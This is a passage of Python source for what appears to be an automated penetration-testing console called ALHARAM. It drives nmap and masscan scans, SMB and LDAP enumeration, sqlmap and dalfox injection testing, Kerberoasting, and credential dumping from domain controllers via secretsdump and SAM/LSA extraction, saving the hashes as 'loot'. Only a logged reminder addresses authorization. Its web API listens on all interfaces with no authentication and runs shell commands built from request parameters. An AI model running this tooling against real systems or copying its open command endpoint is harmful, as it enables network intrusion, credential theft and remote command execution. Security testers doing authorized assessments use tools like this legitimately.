        self.findings=[]; self.recommend=[]; self.hostmap={}
        self.silent = self.profile=="net-pentest"
        self.timing = "-T2" if self.silent else "-T4"

    def log(self,s): self.job["lines"].append(s)
    def ai(self,s):  self.job["lines"].append("[*] "+s)
    def rule(self):  self.job["lines"].append("-"*60)
    def add_find(self,sev,t): self.findings.append((sev,t))
    def add_reco(self,t):
        if t not in self.recommend: self.recommend.append(t)
    def has_creds(self):
        return bool(self.creds.get("user") and (self.creds.get("password") or self.creds.get("ntlm")))
    def cred_str(self):
        u=self.creds.get("user",""); p=self.creds.get("password",""); d=self.creds.get("domain",""); h=self.creds.get("ntlm","")
        s=f"-u {shlex.quote(u)} "; s+= f"-H {shlex.quote(h)} " if h else f"-p {shlex.quote(p)} "
        if d: s+=f"-d {shlex.quote(d)} "
        return s
    def nxc_auth(self):
        return self.cred_str() if self.has_creds() else "-u '' -p '' "
    def stopped(self): return self.job["ctl"]["stop"]

    def run(self, cmd, timeout=600):
        self.log(f"$ {cmd}"); buf=[]; ctl=self.job["ctl"]
        try:
            p=subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                               text=True, bufsize=1, executable="/bin/bash", cwd=str(BASE))
            self.job["proc"]=p; start=time.time()
            def watch():
                while p.poll() is None:
                    if ctl["skip"] or ctl["stop"]:
                        try: p.terminate()
                        except: pass
                        return
                    if time.time()-start>timeout:
                        try: p.terminate()
                        except: pass
                        self.log(f"  [timeout {timeout}s]"); return
                    time.sleep(0.3)
            threading.Thread(target=watch, daemon=True).start()
            for line in iter(p.stdout.readline,""):
                buf.append(line.rstrip("\n")); self.job["lines"].append("  "+line.rstrip("\n"))
            p.stdout.close(); p.wait()
        except Exception as e: self.log(f"  [!] {e}")
        self.job["proc"]=None
        if ctl["skip"]:
            ctl["skip"]=False; self.ai("[skip] step skipped -> continuing")
        return "\n".join(buf)

    # ---------------- entry ----------------
    def go(self):
        self.rule(); self.ai("ALHARAM AUTOPENTEST -- profile-driven engine")
        self.ai(f"Saving output live -> logs/{Path(self.job['logfile']).name}")
        self.ai(f"Profile: {self.PROFILES.get(self.profile, self.profile)}")
        self.ai(f"Credentials: {'YES ('+self.creds.get('user','')+')' if self.has_creds() else 'none -> anonymous / null logins'}")
        self.ai("Scope reminder: only test systems you are authorized to test.")
        self.rule()
        try:
            for kind,val in self.targets:
                if self.stopped(): break
                if kind=="subnet": self.handle_subnet(val)
                elif kind=="url":  self.handle_url(val)
                else:              self.handle_host(val)
            if self.stopped(): self.ai("[stopped] operator stopped -- writing partial report")
            self.report()
            self.ai("AutoPentest complete." if not self.stopped() else "AutoPentest stopped.")
        except Exception as e:
            self.log(f"[!] autopentest error: {e}")
        self.job["done"]=True

    # ---------------- scanning ----------------
    def scan_host(self, host, ports=None):
        portspec = ports or "-p-"
        if self.silent:
            cmd=f"sudo nmap -sS -Pn -n {portspec} -f --data-length 25 {self.timing} --max-retries 1 --scan-delay 100ms -sV -v {host}"
        else:
            cmd=f"nmap -Pn -n {portspec} -sV {self.timing} --min-rate 1000 -v {host}"
        return parse_nmap_normal(self.run(cmd, timeout=1800))

    def handle_host(self, host):
        p=self.profile
        if p=="ad":
            svcs=self.scan_host(host, "-p 53,88,135,139,389,445,464,636,3268,3269,3389,5985,5986,9389")
            self.hostmap[host]=svcs; self.ad_pentest(host, svcs); return
        ports=None
        if p=="web": ports="-p 80,443,8080,8443,8000,8888,8081,3000,5000,9000,9443"
        svcs=self.scan_host(host, ports); self.hostmap[host]=svcs
        self.ai(f"{host}: {len(svcs)} open port(s)")
        if p=="net-scan": return
        self.flag_dc(host, svcs)
        self.pentest_services(host, svcs)

    def handle_subnet(self, subnet):
        self.ai(f"= SUBNET {subnet} -- live-host discovery")
        hosts=[]
        if _installed("fping"):
            out=self.run(f"fping -a -g -q {subnet} 2>/dev/null", timeout=400)
            hosts=[l.strip() for l in out.splitlines() if re.match(r'^\d+\.\d+\.\d+\.\d+$', l.strip())]
        if not hosts:
            out=self.run(f"nmap -sn -n -PE -PS21,22,80,443,445,3389 {subnet}", timeout=800)
            hosts=parse_hosts(out)
        hosts=sorted(set(hosts))
        if not hosts: self.ai("No live hosts found."); return
        live=LOOT_DIR/f"live_{re.sub(r'[^0-9]','_',subnet)}_{datetime.now():%H%M%S}.txt"
        live.write_text("\n".join(hosts)+"\n")
        self.ai(f"{len(hosts)} live host(s) saved -> {live.relative_to(BASE)}")
        for h in hosts[:60]: self.log("   + "+h)
        if len(hosts)>60: self.log(f"   + ...and {len(hosts)-60} more (full list in {live.name})")
        if self.profile in ("masscan","full","net-pentest"):
            self.ai(f"masscan -- all TCP ports on {len(hosts)} live host(s)")
            mout=self.run(f"sudo masscan -iL {live} -p0-65535 --rate 1000 --open-only", timeout=1500)
            byhost={}
            for ip,port,proto in parse_masscan(mout): byhost.setdefault(ip,set()).add(port)
            if not byhost:
                self.ai("masscan found nothing; falling back to per-host scan")
                for h in hosts:
                    if self.stopped(): return
                    self.handle_host(h)
                return
            for ip,ports in byhost.items():
                if self.stopped(): return
                plist=",".join(str(x) for x in sorted(ports))
                self.ai(f"- {ip}: {len(ports)} open ports -> nmap -sV + pentest")
                svcs=parse_nmap_normal(self.run(f"nmap -Pn -n -sV -p{plist} -v {ip}", timeout=800))
                self.hostmap[ip]=svcs
                if self.profile=="net-scan": continue
                self.flag_dc(ip, svcs)
                self.pentest_services(ip, svcs)
        else:
            for h in hosts:
                if self.stopped(): return
                self.handle_host(h)

    def handle_url(self, url):
        pu=urlparse(url); host=pu.hostname or url
        port=pu.port or (443 if pu.scheme=="https" else 80)
        self.hostmap[pu.netloc or host]=[{"port":port,"proto":"tcp","service":pu.scheme,"version":""}]
        self.ai(f"= URL {url}")
        self.web_pentest(host, port, pu.scheme or "http")

    def flag_dc(self, host, svcs):
        openp={s['port'] for s in svcs}
        if {88,389}.issubset(openp) and (445 in openp or 139 in openp):
            self.add_find("info", f"{host}: likely Active Directory Domain Controller")
            self.add_reco(f"{host}: run the 'Active Directory Pentest' profile for the full AD chain")

    def pentest_services(self, host, svcs):
        for s in svcs:
            if self.stopped(): return
            is_web = (s['port'] in WEB_PORTS or any(w in s['service'].lower() for w in WEB_SVC)) and s['port'] not in (5985,5986)
            if is_web:
                sch="https" if (s['port'] in (443,8443,9443) or 'ssl' in s['service'].lower() or 'https' in s['service'].lower()) else "http"
                if self.profile in ("full","web","masscan"):
                    self.web_pentest(host, s['port'], sch)
                else:   # net-pentest: light web fingerprint only
                    if _installed("whatweb"): self.run(f"whatweb -a1 {sch}://{host}:{s['port']}", timeout=60)
                    self.tls_check(host, s['port'])
            else:
                self.port_pentest(host, s)

    # ---------------- TLS + CVE ----------------
    def tls_check(self, host, port):
        self.ai(f"  TLS/SSL check on {host}:{port} (openssl s_client)")
        self.run(f"echo | timeout 8 openssl s_client -connect {host}:{port} 2>/dev/null | grep -aE 'Protocol|Cipher|subject=|issuer=|Verify return'", timeout=25)
        vers=self.run(f"for v in ssl3 tls1 tls1_1 tls1_2 tls1_3; do r=$(echo | timeout 6 openssl s_client -connect {host}:{port} -$v 2>/dev/null | grep -c 'BEGIN CERTIFICATE'); [ $r -gt 0 ] && echo \"  $v SUPPORTED\"; done", timeout=60)
        if re.search(r'(ssl3 SUPPORTED|tls1 SUPPORTED|tls1_1 SUPPORTED)', vers or ''):
            self.add_find("medium", f"{host}:{port} supports weak TLS/SSL (< TLS1.2)")

    def cve_check(self, host, s):
        ver=(s.get("version","") or "").strip()
        if not ver or not _installed("searchsploit"): return
        q=re.sub(r"[^A-Za-z0-9. ]"," ",ver); q=" ".join(q.split()[:4])
        if len(q)<3: return
        o=self.run(f"searchsploit --disable-colour {shlex.quote(q)}", timeout=60)
        hits=[l for l in o.splitlines() if "|" in l and "----" not in l and "Path" not in l]
        if hits and "No Results" not in o:
            self.add_find("high", f"{host}:{s['port']} {ver} -> {len(hits)} public exploit(s) (searchsploit '{q}')")

    # ---------------- per-port brain ----------------
    def port_pentest(self, host, s):
        if self.stopped(): return
        port=s['port']; svc=s['service'].lower(); a=self.nxc_auth()
        if port in TLS_PORTS or any(x in svc for x in ('ssl','tls','https')):
            self.tls_check(host, port)
        self.cve_check(host, s)
        if port in (139,445) or 'smb' in svc or 'microsoft-ds' in svc or 'netbios' in svc:
            self.ai(f"-> SMB {host}:{port} (anon/creds shares+users+rid)")
            o=self.run(f"netexec smb {host} {a}--shares --users --rid-brute", timeout=180)
            if _installed('enum4linux-ng'): self.run(f"enum4linux-ng -A {host}", timeout=200)
            if _installed('smbclient'): self.run(f"smbclient -L //{host}/ -N", timeout=40)
            if re.search(r'signing:False', o or '', re.I):
                self.add_find("medium", f"{host}: SMB signing disabled (NTLM relay candidate)")
        elif port==135 or 'msrpc' in svc:
            self.ai(f"-> RPC {host}:135 (null session)")
            self.run(f"rpcclient -U '' -N {host} -c 'srvinfo;enumdomusers;querydominfo' 2>/dev/null", timeout=60)
        elif port in (389,636) or 'ldap' in svc:
            self.ai(f"-> LDAP {host}:{port}")
            self.run(f"netexec ldap {host} {a}--users --groups", timeout=120)
            self.run(f"ldapsearch -x -H ldap://{host} -s base namingContexts 2>/dev/null", timeout=40)
        elif port==21 or 'ftp' in svc:
            self.ai(f"-> FTP {host}:{port} (anonymous)")
            o=self.run(f"nmap -Pn -n -p{port} --script ftp-anon,ftp-syst,ftp-banner {host}", timeout=60)
            self.run(f"curl -s --max-time 8 ftp://{host}:{port}/ --user 'anonymous:anonymous@'", timeout=20)
            if 'Anonymous FTP login allowed' in (o or ''):
                self.add_find("medium", f"{host}: FTP anonymous login ALLOWED")
        elif port==22 or 'ssh' in svc:
            self.ai(f"-> SSH {host}:{port} (auth methods)")
            self.run(f"nmap -Pn -n -p{port} --script ssh-auth-methods --script-args=ssh.user=root {host}", timeout=60)
        elif port==25 or 'smtp' in svc:
            self.run(f"nmap -Pn -n -p{port} --script smtp-commands,smtp-open-relay {host}", timeout=60)
        elif port==53 or 'domain' in svc:
            self.add_reco(f"{host}: DNS -> try zone transfer: dig axfr @{host} <domain>")
        elif port in (111,2049) or 'nfs' in svc or 'rpcbind' in svc:
            self.ai(f"-> NFS/rpcbind {host} (exports)")
            if _installed('showmount'): self.run(f"showmount -e {host} 2>/dev/null", timeout=40)
        elif port==161 or 'snmp' in svc:
            self.ai(f"-> SNMP {host}:{port} (public community)")
            self.run(f"snmpwalk -v2c -c public -t 2 {host} 2>/dev/null | head -20", timeout=60)
        elif port==1433 or 'ms-sql' in svc or 'mssql' in svc:
            self.ai(f"-> MSSQL {host}:{port}")
            self.run(f"netexec mssql {host} {a}", timeout=90)
        elif port==1521 or 'oracle' in svc:
            self.ai(f"-> Oracle TNS {host}:{port}")
            self.run(f"nmap -Pn -n -p{port} -sV --script oracle-tns-version {host}", timeout=120)
            self.add_reco(f"{host}:{port} Oracle -> enumerate SIDs (odat all -s {host}), test default creds")
        elif port==3306 or 'mysql' in svc:
            self.run(f"nmap -Pn -n -p{port} --script mysql-info,mysql-empty-password {host}", timeout=90)
        elif port==5432 or 'postgres' in svc:
            self.add_reco(f"{host}:{port} PostgreSQL -> try postgres:postgres / trust auth (psql -h {host})")
        elif port==6379 or 'redis' in svc:
            self.ai(f"-> Redis {host}:{port} (unauth check)")
            if _installed('redis-cli'): self.run(f"redis-cli -h {host} -p {port} -t 5 INFO server 2>/dev/null | head", timeout=30)
            self.add_find("high", f"{host}:{port} Redis exposed -> check unauth access (possible RCE)")
        elif port==27017 or 'mongo' in svc:
            self.ai(f"-> MongoDB {host}:{port} (unauth check)")
            self.run(f"mongosh mongodb://{host}:{port} --quiet --eval 'printjson(db.adminCommand({{listDatabases:1}}))' 2>/dev/null | head", timeout=40)
        elif port==9200 or 'elastic' in svc:
            self.run(f"curl -s --max-time 6 'http://{host}:{port}/_cat/indices?v'", timeout=20)
        elif port==3389 or 'ms-wbt' in svc or 'rdp' in svc:
            self.ai(f"-> RDP {host}:{port}")
            self.run(f"netexec rdp {host} {a}", timeout=90)
        elif port in (5985,5986) or 'winrm' in svc or 'wsman' in svc:
            self.ai(f"-> WinRM {host}:{port}")
            self.run(f"netexec winrm {host} {a}"+("-x whoami" if self.has_creds() else ""), timeout=90)
        else:
            self.log(f"  (no dedicated handler for {port}/{svc} -- version+CVE only)")

    # ---------------- web methodology (dirsearch only) ----------------
    def web_pentest(self, host, port, scheme):
        base=f"{scheme}://{host}" if port in (80,443) else f"{scheme}://{host}:{port}"
        self.ai(f"-> WEB methodology on {base}  (dirsearch only; no ffuf/nuclei/nikto/brute-force)")
        if _installed("whatweb"): self.run(f"whatweb -a3 {base}", timeout=90)
        if _installed("httpx"):   self.run(f"echo {base} | httpx -td -server -title -sc -cl -silent", timeout=90)
        self.run(f"curl -sSIk --max-time 15 {base}", timeout=30)
        if scheme=="https": self.tls_check(host, port)
        if _installed("dirsearch"): self.run(f"dirsearch -u {base} -q", timeout=300)
        uf=LOOT_DIR/f"urls_{re.sub(r'[^0-9A-Za-z]','_',host)}_{port}.txt"
        if _installed("katana"):
            self.run(f"katana -u {base} -d 3 -jc -silent | tee {uf} >/dev/null; wc -l {uf}", timeout=180)
        if _installed("gau"):
            self.run(f"gau --threads 5 {host} 2>/dev/null | tee -a {uf} >/dev/null; sort -u {uf} -o {uf}; wc -l {uf}", timeout=120)
        pf=f"{uf}.params"
        self.run(f"grep -aoE 'https?://[^ ]+\\?[A-Za-z0-9_]+=' {uf} 2>/dev/null | sort -u | head -25 > {pf}; wc -l {pf}", timeout=20)
        if _installed("sqlmap"):
            self.run(f"if [ -s {pf} ]; then sqlmap -m {pf} --batch --level 2 --risk 1 --random-agent --answers='follow=Y' | tail -40; else echo 'no parameterized URLs -> skip sqlmap'; fi", timeout=500)
        if _installed("dalfox"):
            self.run(f"if [ -s {pf} ]; then dalfox file {pf} --silence 2>/dev/null | tail -30; else echo 'no parameterized URLs -> skip dalfox'; fi", timeout=300)
        self.add_reco(f"{base}: manual review -> auth/IDOR, business logic, JWT, GraphQL, file upload, SSRF/LFI on discovered params")

    # ---------------- Active Directory ----------------
    def ad_pentest(self, host, svcs):
        d=self.creds.get('domain',''); u=self.creds.get('user',''); p=self.creds.get('password',''); a=self.nxc_auth()
        q=shlex.quote
        self.ai(f"= ACTIVE DIRECTORY PENTEST on {host}")
        self.run(f"nmap -Pn -n -p 88,389,636,3268,3269,9389,445,5985 -sV {host}", timeout=250)
        self.tls_check(host, 636)
        self.ai("Phase 1 -- unauthenticated enumeration (null/anonymous)")
        o=self.run(f"netexec smb {host} -u '' -p '' --shares --users --rid-brute", timeout=180)
        self.run(f"netexec ldap {host} -u '' -p '' --users 2>/dev/null", timeout=120)
        self.run(f"ldapsearch -x -H ldap://{host} -s base namingContexts 2>/dev/null", timeout=40)
        if _installed('enum4linux-ng'): self.run(f"enum4linux-ng -A {host}", timeout=200)
        if re.search(r'signing:False', o or '', re.I):
            self.add_find("medium", f"{host}: SMB signing disabled -> NTLM relay candidate")
        if self.has_creds():
            self.ai("Phase 2 -- authenticated loop (creds loaded)")
            self.run(f"netexec smb {host} {a}--shares --users --groups --pass-pol --loggedon-users --rid-brute", timeout=250)
            self.run(f"netexec ldap {host} {a}--users --groups --computers --asreproast {LOOT_DIR}/asrep_{host}.txt --kerberoasting {LOOT_DIR}/kerb_{host}.txt", timeout=250)
            if d and _installed('bloodhound-python'):
                self.run(f"bloodhound-python -u {q(u)} -p {q(p)} -d {q(d)} -ns {host} -c All --zip", timeout=500)
            if d and _installed('impacket-GetUserSPNs'):
                self.run(f"impacket-GetUserSPNs {q(d)}/{q(u)}:{q(p)} -dc-ip {host} -request -outputfile {LOOT_DIR}/kerberoast_{host}.txt", timeout=200)
            if d and _installed('impacket-GetNPUsers'):
                self.run(f"impacket-GetNPUsers {q(d)}/{q(u)}:{q(p)} -request -format hashcat -dc-ip {host} -outputfile {LOOT_DIR}/asrep2_{host}.txt", timeout=200)
            if d and _installed('certipy'):
                self.run(f"certipy find -u {q(u)}@{q(d)} -p {q(p)} -dc-ip {host} -vulnerable -stdout", timeout=250)
            self.run(f"netexec smb {host} {a}--sam --lsa", timeout=150)
            self.run(f"impacket-secretsdump {q(d)}/{q(u)}:{q(p)}@{host} -just-dc -outputfile {LOOT_DIR}/ntds_{host}", timeout=500)
            self.add_reco(f"{host}: analyze BloodHound; crack roast/asrep hashes (hashcat -m 13100 / -m 18200); PtH & DCSync as rights allow")
        else:
            self.ai("No creds -> unauth phase only. Add credentials to run BloodHound / roasting / ADCS / DCSync.")
            self.add_reco(f"{host}: (no brute-force per policy) obtain a foothold cred, then re-run AD profile with creds")

    # ---------------- report ----------------
    def report(self):
        self.ai("Analysis & report")
        sev={"critical":0,"high":1,"medium":2,"info":3}
        self.findings.sort(key=lambda x: sev.get(x[0],9))
        ts=datetime.now().strftime("%Y-%m-%d %H:%M")
        L=[f"# ALHARAM AutoPentest Report","",
           f"- **Date:** {ts}", f"- **Profile:** {self.PROFILES.get(self.profile, self.profile)}",
           f"- **Auth mode:** {'authenticated ('+self.creds.get('user','')+')' if self.has_creds() else 'anonymous'}",
           f"- **Hosts scanned:** {len(self.hostmap)}",""]
        L+=["## Hosts & Services",""]
        for host,svcs in self.hostmap.items():
            L.append(f"### {host}")
            L+=["","| Port | Proto | Service | Version |","|--|--|--|--|"]
            for s in svcs: L.append(f"| {s['port']} | {s['proto']} | {s['service']} | {s['version']} |")
            L.append("")
        L+=["## Findings",""]
        L+= [f"- **[{sv.upper()}]** {t}" for sv,t in self.findings] or ["- none"]
        L+=["","## Recommended Next Steps",""]
        L+= [f"{i}. {r}" for i,r in enumerate(self.recommend,1)] or ["- none"]
        rpt="\n".join(L)
        name=re.sub(r"[^A-Za-z0-9_.-]","_", (list(self.hostmap)[0] if self.hostmap else "scan"))+f"_{datetime.now():%H%M%S}.md"
        (REPORT_DIR/name).write_text(rpt)
        self.rule(); self.ai(f"REPORT SAVED: reports/{name}"); self.rule()
        for l in rpt.splitlines(): self.job["lines"].append(l)
        self.job["report"]=name

def start_ai_job(targets, profile, creds):
    jid, job = _new_job(f"autopentest {len(targets)} target(s)")
    def worker():
        try: AutoPentest(job, targets, profile, creds).go()
        finally: job["rc"]=0; job["done"]=True
    threading.Thread(target=worker, daemon=True).start()
    return jid


# ===========================================================================
# HTTP handler
# ===========================================================================
class H(BaseHTTPRequestHandler):
    def log_message(self,*a): pass
    def _send(self, code, body, ctype="application/json"):
        if isinstance(body,(dict,list)): body=json.dumps(body)
        if isinstance(body,str): body=body.encode()
        self.send_response(code)
        self.send_header("Content-Type",ctype); self.send_header("Access-Control-Allow-Origin","*")
        self.send_header("Access-Control-Allow-Headers","Content-Type")
        if ctype.startswith("text/html"):
            self.send_header("Cache-Control","no-store, no-cache, must-revalidate")
        self.end_headers()
        self.wfile.write(body)
    def do_OPTIONS(self): self._send(200,{"ok":True})
    def _json(self):
        n=int(self.headers.get("Content-Length",0))
        if not n: return {}
        try: return json.loads(self.rfile.read(n).decode())
        except: return {}

    def do_GET(self):
        p=urlparse(self.path); path=p.path; q=parse_qs(p.query)
        if path in ("/","/pentest_tool.html"):
            f=BASE/"pentest_tool.html"
            return self._send(200, f.read_bytes(), "text/html; charset=utf-8") if f.exists() else self._send(404,{"error":"html missing"})
        if path=="/api/tools":
            return self._send(200, {"tools":[{k:t[k] for k in ("id","name","cat","desc","inputs","method")}|{"installed":is_installed(t),"custom":t["method"]=="smart"} for t in all_tools()]})
        if path=="/api/output":
            jid=(q.get("job") or [""])[0]; pos=int((q.get("pos") or ["0"])[0]); job=JOBS.get(jid)
            if not job: return self._send(404,{"error":"no such job"})
            lo=job["lines"]; base=getattr(lo,"base",0); total=base+len(lo)
            skipped = pos < base                    # client fell behind the memory window
            idx = max(0, pos-base)
            chunk = lo[idx:]
            if len(chunk) > 1500:                   # cap payload; keep newest, note the gap
                chunk = chunk[-1500:]; skipped = True
            return self._send(200,{"lines":chunk,"pos":total,"skipped":skipped,
                                   "done":job["done"],"rc":job["rc"],"report":job.get("report")})
        if path=="/api/jobs":
            return self._send(200,{"jobs":[{"id":k,"label":v["label"],"done":v["done"]} for k,v in JOBS.items()]})
        if path=="/api/reports":
            return self._send(200,{"reports":sorted([f.name for f in REPORT_DIR.glob('*.md')],reverse=True)})
        if path=="/api/report":
            name=os.path.basename((q.get("name") or [""])[0]); f=REPORT_DIR/name
            return self._send(200, f.read_text(), "text/markdown; charset=utf-8") if f.exists() else self._send(404,{"error":"no report"})
        if path=="/api/logs":
            return self._send(200,{"logs":sorted([f.name for f in LOG_DIR.glob('*.txt')],reverse=True)})
        if path=="/api/log":
            name=os.path.basename((q.get("name") or [""])[0]); f=LOG_DIR/name
            return self._send(200, f.read_text(errors="replace"), "text/plain; charset=utf-8") if f.exists() else self._send(404,{"error":"no log"})
        if path=="/api/check-updates":
            return self._send(200, self.check_updates())
        return self._send(404,{"error":"not found"})

    def do_POST(self):
        path=urlparse(self.path).path
        if path=="/api/run":
            b=self._json(); t=tool_by_id(b.get("tool"))
            if not t: return self._send(400,{"error":"unknown tool"})
            cmd=build_run_cmd(t,b.get("params",{})); return self._send(200,{"job":start_job(cmd,t['name']),"cmd":cmd})
        if path=="/api/autopilot":
            b=self._json()
            targets=[]
            if b.get("target"):
                c=classify(b["target"]);  targets.append(c) if c else None
            for line in (b.get("scope") or "").splitlines():
                c=classify(line);  targets.append(c) if c else None
            if b.get("scopefile") and Path(b["scopefile"]).exists():
                for line in Path(b["scopefile"]).read_text().splitlines():
                    c=classify(line);  targets.append(c) if c else None
            if not targets: return self._send(400,{"error":"no valid targets"})
            return self._send(200,{"job":start_ai_job(targets, b.get("profile","full"), b.get("creds",{})),
                                   "count":len(targets)})
        if path=="/api/install":
            t=tool_by_id(self._json().get("tool"))
            if not t: return self._send(400,{"error":"unknown tool"})
            return self._send(200,{"job":start_job(install_script(t), f"install {t['name']}")})
        if path=="/api/update":
            t=tool_by_id(self._json().get("tool"))
            if not t: return self._send(400,{"error":"unknown tool"})
            return self._send(200,{"job":start_job(smart_update(t), f"update {t['name']}")})
        if path=="/api/skip":
            job=JOBS.get(self._json().get("job"))
            if job: job["ctl"]["skip"]=True
            if job and job.get("proc"):
                try: job["proc"].terminate()
                except: pass
            return self._send(200,{"ok":True})
        if path=="/api/stop":
            job=JOBS.get(self._json().get("job"))
            if job: job["ctl"]["stop"]=True
            if job and job.get("proc"):
                try: job["proc"].terminate()
                except: pass
            return self._send(200,{"ok":True})
        if path=="/api/upload": return self.handle_upload()
        return self._send(404,{"error":"not found"})

    def handle_upload(self):
        ctype=self.headers.get("Content-Type","")
        if "multipart/form-data" not in ctype: return self._send(400,{"error":"expected multipart"})
        fs=cgi.FieldStorage(fp=self.rfile, headers=self.headers,
                            environ={"REQUEST_METHOD":"POST","CONTENT_TYPE":ctype})
        saved=[]
        for item in (fs.list or []):
            if getattr(item,"filename",None):
                name=os.path.basename(item.filename).replace(" ","_")
                dest=UPLOAD_DIR/f"{uuid.uuid4().hex[:6]}_{name}"; dest.write_bytes(item.file.read()); saved.append(str(dest))
        if not saved: return self._send(400,{"error":"no file"})
        if len(saved)>1:
            comb=UPLOAD_DIR/f"{uuid.uuid4().hex[:6]}_combined.txt"
            with open(comb,"w") as o:
                for s in saved: o.write(Path(s).read_text()+"\n")
            return self._send(200,{"path":str(comb),"files":saved,"count":len(saved)})
        return self._send(200,{"path":saved[0],"files":saved,"count":1})

    def check_updates(self):
        subprocess.run("sudo apt-get update", shell=True, capture_output=True)
        up=subprocess.run("apt list --upgradable 2>/dev/null", shell=True, capture_output=True, text=True).stdout
        upg={l.split("/")[0] for l in up.splitlines() if "/" in l}
        return {"tools":[{"id":t["id"],"name":t["name"],"update_available":t["pkg"] in upg}
                         for t in TOOLS if t["method"]=="apt" and is_installed(t)]}

def local_ip():
    try:
        s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM); s.connect(("8.8.8.8",80))
        ip=s.getsockname()[0]; s.close(); return ip
    except: return "127.0.0.1"

def main():
    port=int(sys.argv[1]) if len(sys.argv)>1 else 8000; ip=local_ip()
    print("="*68); print("  ALHARAM backend — pentest console + AutoPentest"); print("="*68)
    print(f"  Local : http://localhost:{port}")
    print(f"  Kali  : http://{ip}:{port}   <-- open from your Windows browser")
    print(f"  Tools : {len(TOOLS)} (curated core)")
    print("  Ctrl+C to stop"); print("="*68)
    ThreadingHTTPServer(("0.0.0.0",port), H).serve_forever()

if __name__=="__main__":
    main()
